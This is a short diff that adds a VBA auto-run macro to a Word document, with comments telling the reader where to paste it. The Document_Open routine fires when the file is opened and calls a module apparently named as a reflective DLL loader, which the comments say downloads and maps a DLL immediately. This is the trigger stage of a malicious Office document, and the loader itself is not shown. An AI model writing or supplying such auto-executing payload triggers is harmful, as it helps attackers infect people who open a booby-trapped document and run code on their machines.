@@ -1,0 +1,7 @@
+' Paste this into ThisDocument (double-click it in the Project Explorer).
+' Fires when the .doc is opened — downloads and maps the DLL immediately.
+' The module name must match the standard module you pasted the script into.
+
+Private Sub Document_Open()
+    ReflectiveLoader_WinHTTP_Standalone.Run
+End Sub
